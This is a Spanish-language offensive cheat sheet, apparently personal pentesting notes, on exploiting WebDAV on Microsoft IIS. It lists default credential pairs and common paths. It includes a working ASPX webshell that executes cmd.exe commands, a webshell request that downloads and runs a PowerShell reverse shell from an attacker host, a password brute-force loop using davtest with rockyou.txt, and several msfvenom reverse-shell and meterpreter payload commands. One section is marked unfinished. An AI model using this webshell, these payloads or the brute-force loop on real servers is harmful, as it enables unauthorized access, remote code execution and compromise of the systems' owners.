# Explotación de WebDAV en IIS

Tags: #IIS #WebDav #Servidor #Windows 


```bash 
# Credenciales por defecto 
	admin:admin
	administrator:administrator
	webdav:webdav
	webdav:password 
	user:password
```

```bash 
# Rutas comunes en web 
http://<IP>/webdav/
http://<IP>/WebDAV/
http://<IP>/webdav
http://<IP>/WebDAV

NOTA:
	- Se necesitan credenciales validas para ingresar al WebDav en la web
```

```bash 
# Pero en IIS WebDAV normalmente no implica que exista literalmente una carpeta /webdav/. Puede estar habilitado sobre el sitio raíz o sobre un virtual directory.
http://<IP>/
http://<IP>/uploads/
http://<IP>/files/
http://<IP>/documents/
http://<IP>/shared/
http://<IP>/web/
```

## Tools comunes 

* [Browsh](https://github.com/browsh-org/browsh)

```bash 
- davtest      # Usada para escanear, autenticar y explotar un WebDAV
- cadaver      # Soporta la subida y bajada de archivos, visualización, editar, mover/copiar, borrar, manipular y bloqueo
```

```bash 
# Enumeración del buscador de un IIS en forma de GUI
❯ browsh --startup-url http://IP/Default.aspx/    
```

## Cadaver 

Sirve para subir archivos, descargar contenido, etc... Debemos de tener el usuario y password validos para la autenticación. 

```bash 
# Acceder al contenido de la web con credenciales  
❯ cadaver http://IP/webdav   
	❯ ?       # Mostrar los comandos disponibles 
	❯ put webshell.aspx    # Subir una webshell (Colocar la ruta)
	❯ exit    # Salir 

NOTA: 
	- Soporta extensiones ASPX, ASP
```

## Cadaver forma 1 - Revershell 

```bash 
❯ cadaver http://IP/webdav   # Conectarse al WebDav 
	❯ ?       # Mostrar los comandos disponibles 
	❯ put webshell.aspx      # Subir una webshell (Colocar la ruta)
	❯ exit    # Salir 


# Ejecutar un comando despues de subir la webshell 
	http://IP/webshell.aspx?cmd=whoami 
```

```bash 
# Webshell clásica 
<%-- cmd.aspx → webshell básica para IIS --%>
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% 
    string cmd = Request.QueryString["cmd"];
    if (cmd != null) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
        p.WaitForExit();
    }
%>
```

* [Invoke-PowerShellTcp.ps1](https://gist.github.com/PwnPeter/cb3becedd8b8ce1f80e189760ddeb047)

```bash 
# Revershell
http://<IP>/webshell.aspx?cmd=powershell+-c+"IEX(New-Object+Net.WebClient).DownloadString('http://<IP_KALI>/Invoke-PowerShellTcp.ps1')"

NOTA:
	- Compartir en Kali el 'Invoke-PowerShellTcp.ps1'
	- Recibir con Netcat la Revershell 
```

## Cadaver forma 2 - Revershell  ????? TERMINAR

```bash 
❯ cadaver http://IP/webdav   # Conectarse al WebDav 
	❯ ?       # Mostrar los comandos disponibles 
	❯ put /home/user/Dowloads/webshell.aspx      # Subir una webshell (Colocar la ruta)
	❯ exit    # Salir 


# Ejecutar un comando despues de subir la webshell 
	http://IP/webshell.aspx?cmd=whoami 
```

```bash 
# Revershell (Forma 2)
# Solo se sube este archivo y se ejecuta desde la web 

# Creación de una Revershell stageless 
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_Kali LPORT=443 -f exe -o reverse.exe



NOTA:
	- Rutas comunes donde subir el archivo en IIS
		C:\inetpub\wwwroot\          → raíz del servidor web → acceder en http://IP/cmd.aspx
C:\inetpub\wwwroot\uploads\  → si hay directorio de uploads
```

## Davtest

Esta tool crea un directorio en el servidor y va subiendo archivos con diferentes extensiones además de ver cuales se pueden ejecutar. 
```bash 
# Se necesitan credenciales 
❯ davtest -auth <user>:<passwd> -url http://IP/webdav 
# Enumera extensiones de archivos que se pueden subir   
```

```bash 
# Se necesitan credenciales 
❯ davtest -url http://127.0.0.1 -auth admin:password  
```

```bash 
# Fuerza bruta con Davtest 
❯ cat /usr/share/wordlists/rockyou.txt | while read password; do response=$(davtest -url http://127.0.0.1 -auth admin:$password 2>&1 | grep -i succed); if [ $response ]; then echo "[+] La passwd correcta es: $password"; break; fi; done
```

## Archivos maliciosos para un Webdav  con MSFVenom

```bash 
# Creación de una Revershell 
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=443 -f aspx -o reverse.aspx    # Stageless 
	# Si la maquina no es x64, quitar esa parte en el payload y convertirla a x86

❯ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.10.1 LPORT=443 -f exe -o reverse.exe  # Stageless  
	# Recibir la Revershell con 'Metasploit' usando el módulo de 'multi_handler' para obtener una consola con 'Meterpreter'	

❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.68.1 LPORT=443 -f asp > shell.asp
	# p = PLayload 
	# f = Formato

❯ msfvenom -p windows/shell/reverse_tcp LHOST=192.168.68.1 LPORT=443 -f aspx > shell.aspx
```